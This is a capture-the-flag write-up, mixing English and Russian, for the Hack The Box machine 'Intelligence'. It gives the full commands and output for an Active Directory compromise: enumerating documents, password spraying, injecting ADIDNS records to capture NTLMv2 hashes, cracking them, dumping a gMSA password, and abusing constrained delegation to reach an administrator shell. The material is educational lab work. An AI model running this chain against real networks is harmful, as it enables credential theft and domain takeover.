---
title: "[HTB] Intelligence"
permalink: /writeups/htb/intelligence/
excerpt: "Краткий разбор машины Intelligence с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - bloodhound
  - gmsa
  - dns
---

---

{% include toc icon="cog" title="Intelligence Solution" %}

The [Intelligence](https://app.hackthebox.com/machines/Intelligence) machine has been created by [Micah](https://app.hackthebox.com/users/22435). This is a **medium** Windows Machine with a strong focus on Active Directory enumeration and exploitation. This box is really interesting, it shows some exploitation paths that are not always common like ADIDNS abuse or GMSA passwords.

If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
{: .text-justify}

![image-center](/images/htb/htb_intelligence_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/). Note the **-sV** switch which enables *version detection* and allows Nmap to check its internal database to try to determine the service protocol, application name and version number.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -Pn -sV 10.129.95.154 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-10 13:48 EDT
Nmap scan report for 10.129.95.154
Host is up (0.032s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
80/tcp  open  http          Microsoft IIS httpd 10.0
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-11 00:49:08Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

As we can see, the machine seems to be a domain controller for **intelligence.htb** and we have a few interesting services including a Web server running on TCP/80.

## HTTP

By looking at the website located at the following URL *http://10.129.95.154*, we found two (2) downloadable documents.

![image-center](/images/htb/htb_intelligence_website.png){: .align-center} 

While the documents did not contain any interesting information, by looking at their links we can see a pattern:

- http://10.129.95.154/documents/2020-01-01-upload.pdf
- http://10.129.95.154/documents/2020-12-15-upload.pdf

Maybe we could try to enumerate the dates and see if we can find any other document hosted on the server.

## Enumeration with Python

Here, we wrote a quick python script in order to find potential documents. If a document is found, it will be downloaded on our Kali machine.

```python
import requests

url = "http://10.129.95.154/documents/"

# Generate filenames
for m in range(1,13):
	month = str(m).zfill(2)
	for d in range(1,32):
		day = str(d).zfill(2)

		fname = "2020-%s-%s-upload.pdf" % (month, day)
		r = requests.get(url + fname)

		# Check if the file exists
		if r.status_code == 200:
			print("[+] Found: " + url + fname)

			with open(fname, 'wb') as fd:
				fd.write(r.content)
```

As you can see, we found a large quantity of documents.

```bash
$ python3 find_files.py 
[+] Found: http://10.129.95.154/documents/2020-01-01-upload.pdf
[+] Found: http://10.129.95.154/documents/2020-01-02-upload.pdf
[+] Found: http://10.129.95.154/documents/2020-01-04-upload.pdf
[+] Found: http://10.129.95.154/documents/2020-01-10-upload.pdf
[+] Found: http://10.129.95.154/documents/2020-01-20-upload.pdf
[+] Found: http://10.129.95.154/documents/2020-01-22-upload.pdf
[+] Found: http://10.129.95.154/documents/2020-01-23-upload.pdf
[+] Found: http://10.129.95.154/documents/2020-01-25-upload.pdf
[+] Found: http://10.129.95.154/documents/2020-01-30-upload.pdf

...[snip]...
```

After looking at the documents, we found two (2) interesting PDFs. The first one is **2020-06-04-upload.pdf**.

```text
New Account Guide

Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876

After logging in please change your password as soon as possible.
```

It seems we have a password (`NewIntelligenceCorpUser9876`) that seems to be used as default for new accounts. The second interesting file is **2020-12-30-upload.pdf**.

```text
Internal IT Update

There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.
```

This document talks about some kind of script, we will probably get back to that later. Now, given we have a password, there should be some usernames hidden somewhere.

## EXIF

Using [exiftool](https://exiftool.org), a metadata reader, we were able to extract usernames from the PDFs metadata. 

```bash
$ exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq   
   84 image files read
Anita.Roberts
Brian.Baker
Brian.Morris
Creator
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```

Here you can redirect the output to a file in order to produce a list of usernames.


# Первичный доступ

In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives. Here, we got a list of usernames and one password, let's see what we can do with that.

## Password spraying

As stated by [MITRE](https://attack.mitre.org/techniques/T1110/003/), adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password, or a small list of commonly used passwords, that may match the complexity policy of the domain.

Since we have a list of usernames and a potential password, we can use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), to see if one of the accounts is using the password we discovered earlier. Note that we used the `--continue-on-success` to make sure that `crackmapexec` will go through the entire list of usernames, even if a valid account is discovered.

```bash
$ crackmapexec smb 10.129.95.154 -u users.txt -p NewIntelligenceCorpUser9876 --continue-on-success
SMB         10.129.95.154   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 

...[snip]...

SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
```

We found a valid account (`Tiffany.Molina:NewIntelligenceCorpUser9876`). However, this account does not seem to have a remote shell access to the target machine. Let's check if the user has access to potential shared folders.

## Shared Folders

Again, with `crackmapexec` and the `--shares` switch, we can see if **tiffany.molina** has READ permissions on some remote shares.

```bash
$ crackmapexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
SMB         10.129.95.154   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [+] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ        
```

Nice! Using another tool, [impacket-smbclient](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py), we can read the content of **Tiffany.Molina** user folder and grab the **first flag**.

```bash
$ impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@10.129.95.154
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# use Users
# cd Tiffany.Molina\Desktop
# ls
drw-rw-rw-          0  Sun Apr 18 20:51:46 2021 .
drw-rw-rw-          0  Sun Apr 18 20:51:46 2021 ..
-rw-rw-rw-         34  Fri Jun 10 20:45:48 2022 user.txt
```

After checking the other shares, we found an interesting script named **downdetector.ps1** in the **IT** folder. It is probably the script that one of the PDF was talking about.

```bash
# use IT
# ls
drw-rw-rw-          0  Sun Apr 18 20:50:58 2021 .
drw-rw-rw-          0  Sun Apr 18 20:50:58 2021 ..
-rw-rw-rw-       1046  Sun Apr 18 20:50:58 2021 downdetector.ps1
# cat downdetector.ps1
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

The script seems top loop through DNS records and sends an authenticated request to any host having a name starting with **web** in order to check its status. Let's see what we can do with that.

# Повышение привилегий

According to the MITRE, [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) consists of techniques that adversaries use to gain higher-level permission on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permission to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## ADIDNS Abuse

We found an interesting [post](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing) about ADIDNS abuse. Basically, AD services need DNS to work properly. So, Active Directory Domain Services offer an integrated storage and replication service for DNS records called Active Directory Integrated DNS (ADIDNS). 

Since ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, we can leverage this permission and create arbitrary DNS records that points to our own IP address. 

There is a toolbox online called [Krbrelayx](https://github.com/dirkjanm/krbrelayx) that can help us to do that. Using [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) we can create our own record.

```bash
$ python3 dnstool.py -u "intelligence\Tiffany.Molina" -p NewIntelligenceCorpUser9876 10.129.95.154 -a add -r web1 -d 10.10.14.20 -t A
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Then, using [responder](https://github.com/lgandx/Responder), an LLMNR, NBT-NS and MDNS poisoner, we were able to capture a hash for the **ted.graves** account.

```bash
$ sudo responder -I tun0

...[snip]...

[+] Listening for events...

[HTTP] NTLMv2 Client   : ::ffff:10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:4f18ec29602f5b50:D412F532F59E21498967A5A1DEC544C3:0101000000000000F8EE1A5F387DD801E2BBA8D36D879177000000000200080031004B004D00340001001E00570049004E002D0031003500500039003000560046004F003600460048000400140031004B004D0034002E004C004F00430041004C0003003400570049004E002D0031003500500039003000560046004F003600460048002E0031004B004D0034002E004C004F00430041004C000500140031004B004D0034002E004C004F00430041004C0008003000300000000000000000000000002000005B3DEC70843423B3A43537C3C99170AE0C4E334BB2D989E60634D882103F66460A001000000000000000000000000000000000000900340048005400540050002F0077006500620031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000  
```

Let's see if we can crack this password.

## Взлом пароля

Now just have to copy/paste the following hash in a file and try to crack it offline using the *rockyou* (or any other list) passwords list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). 

```text
Ted.Graves::intelligence:4f18ec29602f5b50:D412F532F59E21498967A5A1DEC544C3:0101000000000000F8EE1A5F387DD801E2BBA8D36D879177000000000200080031004B004D00340001001E00570049004E002D0031003500500039003000560046004F003600460048000400140031004B004D0034002E004C004F00430041004C0003003400570049004E002D0031003500500039003000560046004F003600460048002E0031004B004D0034002E004C004F00430041004C000500140031004B004D0034002E004C004F00430041004C0008003000300000000000000000000000002000005B3DEC70843423B3A43537C3C99170AE0C4E334BB2D989E60634D882103F66460A001000000000000000000000000000000000000900340048005400540050002F0077006500620031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)     
1g 0:00:00:09 DONE (2022-06-10 15:13) 0.1095g/s 1184Kp/s 1184Kc/s 1184KC/s Mrz.deltasigma..Mr BOB
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Nice, we have a cleartext password.

## Разведка Active Directory

With this new compromised, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. 

Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Here, we used a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c All -u Ted.Graves -p Mr.Teddy -d intelligence.htb -ns 10.129.95.154 --zip
INFO: Found AD domain: intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The resolution lifetime expired after 3.2035555839538574 seconds: Server 10.129.95.154 UDP port 53 answered The DNS operation timed out.; Server 10.129.95.154 UDP port 53 answered The DNS operation timed out.
INFO: Done in 00M 07S
INFO: Compressing output into 20220610151445_bloodhound.zip
```

Now, you can import the generated file (*20220204141002_bloodhound.zip*) in BloodHound by running `sudo neo4j start`, then execute BloodHound in another terminal with the `bloodhound` command. 

![image-center](/images/htb/htb_intelligence_bloodhound.png){: .align-center}

As you can see, we have a really interesting attack path.

## Abuse ReadGMSAPassword

According to **BloodHound**, **Ted.Graves** is part of the **itsupport** group. This specific group has *ReadGMSAPassword* permission on the **svc_int** domain account.

Group Managed Service Accounts (GMSA) are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval. The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.

Using a tool called [gMSADumper](https://github.com/micahvandeusen/gMSADumper), we can abuse the **ReadGMSAPassword** permission and read any gMSA password blobs.

```bash
$ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.129.95.154
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::67065141d298d67a17ee8626476b20f9
```

We now have the NTLM hash of the **svc_int** domain account.

## Abuse AllowedToDelegate

Here, **svc_int** has the constrained delegation privilege to **dc.intelligence.htb**. The constrained delegation primitive allows a principal to authenticate as any user to specific services, here it's *www/dc.inteligence.htb*. That is, a node with this privilege can impersonate any domain principal (including **Domain Admins**) to the specific service on the target host.

To perform the attack, we can use [impacket-getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py), a tool that allows us to request a Service Ticket and save it as ccache.

**Заметка:** If the time difference between your machine and the attack machine is too great, you will get the following error: **KRB_AP_ERR_SKEW(Clock skew too great)**. This can be fixed by running the following command `sudo ntpdate <target_machine>`.
{: .notice--info}

```bash
$ impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :67065141d298d67a17ee8626476b20f9 -dc-ip 10.129.95.154
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```
 
Nice, we have a ticket, we can export it with `export KRB5CCNAME=Administrator.ccache` and use it with [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) to grab the **second flag**.

Note that you will need to add `10.129.95.154 dc.intelligence.htb` to your **/etc/hosts** file as the `-k` switch will use our credentials from ccache file (KRB5CCNAME) and it needs the FQDN.

```bash
$ impacket-wmiexec -k -no-pass dc.intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

C:\>dir c:\users\administrator\desktop
 Volume in drive C has no label.
 Volume Serial Number is E3EF-EBBD

 Directory of c:\users\administrator\desktop

04/18/2021  05:51 PM    <DIR>          .
04/18/2021  05:51 PM    <DIR>          ..
06/10/2022  08:54 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5,975,379,968 bytes free
```

Awesome! I hope you enjoyed it, I know I did :)
